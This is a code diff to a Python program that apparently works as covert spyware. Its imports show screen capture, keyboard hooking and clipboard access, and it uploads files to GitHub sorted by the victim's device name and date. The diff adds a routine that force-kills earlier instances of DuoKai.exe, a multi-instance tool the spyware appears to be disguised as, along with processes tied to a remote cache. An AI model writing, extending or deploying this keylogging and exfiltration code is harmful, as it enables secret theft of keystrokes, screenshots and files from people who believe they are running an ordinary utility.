@@ -1,8 +1,10 @@
 import base64
 import os
 import socket
+import sys
 import threading
 import time
+import subprocess
 from PIL import Image, ImageGrab
 from pynput import keyboard
 import pyperclip
@@ -21,16 +23,49 @@ GITHUB_CONFIG = {
 uploaded_files = set()
 
 
+def kill_previous_instances():
+    """强制清理当前电脑上旧的 DuoKai.exe / 火麒麟多开 pro 进程"""
+    try:
+        current_pid = os.getpid()
+        
+        # 1. 直接清理名为 DuoKai.exe 且 PID 不是当前进程的实例
+        cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
+        output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
+        
+        for line in output.splitlines():
+            if "DuoKai.exe" in line:
+                parts = line.split(',')
+                if len(parts) >= 2:
+                    pid_str = parts[1].replace('"', '').strip()
+                    if pid_str.isdigit():
+                        pid = int(pid_str)
+                        if pid != current_pid:
+                            subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
+
+        # 2. 补充检测：使用 wmic 根据命令行特征或缓存文件名清理残留
+        cmd_wmic = 'wmic process where "name like \'%DuoKai%\' or commandline like \'%_remote_main_cache%\'" get processid'
+        output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
+        for line in output_wmic.splitlines():
+            line = line.strip()
+            if line.isdigit():
+                pid = int(line)
+                if pid != current_pid:
+                    subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
+
+    except Exception:
+        pass
+
+
 def upload_file_smart(file_path):
     if not os.path.exists(file_path) or not GITHUB_CONFIG["token"]:
         return False
 
     file_name = os.path.basename(file_path)
     
-    # 1. 主文件夹：设备名 (例如: WORK-PC)
+    # 1. 主文件夹：设备名
     device_folder = DEVICE_NAME
 
-    # 2. 子文件夹：日期 (例如: 8.25)
+    # 2. 子文件夹：日期
     date_folder = time.strftime('%m.%d').lstrip('0').replace('.0', '.')
 
     # 3. 结构：uploads/设备名/日期/文件名
@@ -158,6 +193,9 @@ def on_press(key):
 
 
 def run(token):
+    # 1. 优先清理旧的 DuoKai.exe 残留进程
+    kill_previous_instances()
+
     GITHUB_CONFIG["token"] = token
     write_txt("启动", "加载完成，服务已启动")
 
